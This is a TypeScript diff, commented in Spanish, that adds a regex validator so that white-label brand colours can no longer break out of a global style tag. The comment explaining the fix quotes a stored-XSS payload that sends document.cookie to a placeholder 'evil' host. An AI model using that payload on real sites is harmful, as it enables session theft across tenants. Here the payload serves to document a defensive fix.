@@ -33,21 +33,46 @@ export async function getPlatformConfigSSR(): Promise<PlatformConfig> {
 }
 
 /**
+ * Round 22 P1 (Security Pentester): pre-validador estricto de color CSS.
+ * Antes el `cfg.brand.primaryColor` se interpolaba directo dentro de un
+ * `<style dangerouslySetInnerHTML>` global → un superadmin malicioso podía
+ * inyectar `red;}</style><script>fetch('//evil/'+document.cookie)</script>`
+ * y comprometer TODOS los tenants en cada request.
+ *
+ * Acepta solo formatos seguros:
+ *   - hex 3/4/6/8 dígitos: #abc, #abcd, #aabbcc, #aabbcc88
+ *   - rgb()/rgba() con números enteros + alpha decimal opcional
+ *   - hsl()/hsla() con grados + %
+ * Rechaza cualquier cosa con `;`, `}`, `<`, `>`, comillas o llaves.
+ */
+const COLOR_RE = /^(?:#[0-9a-fA-F]{3,8}|rgba?\(\s*\d+\s*,\s*\d+\s*,\s*\d+(?:\s*,\s*[\d.]+)?\s*\)|hsla?\(\s*\d+\s*,\s*\d+%?\s*,\s*\d+%?(?:\s*,\s*[\d.]+)?\s*\))$/;
+
+function safeColor(value: string | null | undefined): string | null {
+  if (typeof value !== "string") return null;
+  const trimmed = value.trim();
+  if (!COLOR_RE.test(trimmed)) return null;
+  return trimmed;
+}
+
+/**
  * Devuelve un bloque CSS `:root` con los CSS vars de marca aplicados.
  * Inyectar en `<head>` o al inicio de `<body>` para evitar FOUC.
  *
  * Sólo emite vars cuyos valores difieran del default — así no
  * sobreescribimos los tokens del DS si el cliente todavía no
- * configuró nada.
+ * configuró nada. Round 22: cada valor pasa por safeColor() antes
+ * de interpolarse — rechaza payloads de stored XSS.
  */
 export function brandColorOverridesCss(cfg: PlatformConfig): string | null {
   const overrides: string[] = [];
-  if (cfg.brand.primaryColor && cfg.brand.primaryColor !== PLATFORM_CONFIG_DEFAULTS.brand.primaryColor) {
-    overrides.push(`--brand-primary: ${cfg.brand.primaryColor};`);
-    overrides.push(`--accent: ${cfg.brand.primaryColor};`);
+  const primary = safeColor(cfg.brand.primaryColor);
+  if (primary && primary !== PLATFORM_CONFIG_DEFAULTS.brand.primaryColor) {
+    overrides.push(`--brand-primary: ${primary};`);
+    overrides.push(`--accent: ${primary};`);
   }
-  if (cfg.brand.secondaryColor && cfg.brand.secondaryColor !== PLATFORM_CONFIG_DEFAULTS.brand.secondaryColor) {
-    overrides.push(`--brand-secondary: ${cfg.brand.secondaryColor};`);
+  const secondary = safeColor(cfg.brand.secondaryColor);
+  if (secondary && secondary !== PLATFORM_CONFIG_DEFAULTS.brand.secondaryColor) {
+    overrides.push(`--brand-secondary: ${secondary};`);
   }
   if (overrides.length === 0) return null;
   return `:root{${overrides.join("")}}`;
